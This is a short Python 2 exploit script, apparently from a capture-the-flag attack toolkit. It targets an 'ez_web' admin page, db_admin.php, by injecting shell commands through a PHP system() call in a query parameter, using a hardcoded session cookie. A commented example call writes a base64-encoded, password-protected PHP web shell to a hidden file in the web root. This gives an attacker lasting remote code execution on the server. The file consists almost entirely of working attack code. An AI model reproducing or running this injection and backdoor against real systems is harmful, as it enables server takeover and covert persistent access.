#!/usr/bin/env python


from http import http
from config import *
from function import *
from urllib import quote

def db_admin_attack(target,cmd,cookie):
    header = {"Cookie":cookie}
    res = "error"
    print cmd
    cmd = quote(cmd)
    try:
    	res = http("get",target,target_port,"/ez_web/admin/db_admin.php?db=admin&action=listRows&collection=zzz&find=array(1);system('"+ cmd +"');exit;","",header)
	#print res
    except Exception,e:
	dump_error(target,"something error happens","db_admin_attack.py db_admin_attack")
    return res
#print db_admin_attack("127.0.0.1","ls","PHPSESSID=vavafb01qsskmhu41dnk08d1r1;")
#print db_admin_attack("127.0.0.1","/bin/echo PD9waHAgaWYoJF9SRVFVRVNUW2hhc2hdPT0iOGUwM2RmZTY0YmNmYzE5OTMyOTgxNzk3NjQxOGFiYWUiKXskY18xID0gYmFzZTY0X2RlY29kZShzdHJfcm90MTMoJF9SRVFVRVNUW2FdKSk7JGNfMiA9IGJhc2U2NF9kZWNvZGUoc3RyX3JvdDEzKCRfUkVRVUVTVFtiXSkpOyRjXzEoJGNfMik7fT8+ | /usr/bin/base64 -d | /bin/cat > /var/www/html/ez_web//.5ba106f5e0946576c7bdd26672bb8ee1.php","PHPSESSID=vavafb01qsskmhu41dnk08d1r1;")
